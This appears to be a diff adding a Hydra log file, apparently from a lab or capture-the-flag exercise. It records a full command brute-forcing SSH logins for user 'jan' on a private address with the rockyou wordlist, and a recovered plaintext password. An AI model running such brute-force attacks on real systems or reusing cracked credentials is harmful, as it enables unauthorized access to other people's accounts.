@@ -1,0 +1,2 @@
+# Hydra v9.6 run at 2026-06-25 20:12:19 on 10.49.145.188 ssh (hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 4 -v -o hydra.txt ssh://10.49.145.188)
+[22][ssh] host: 10.49.145.188   login: jan   password: armando
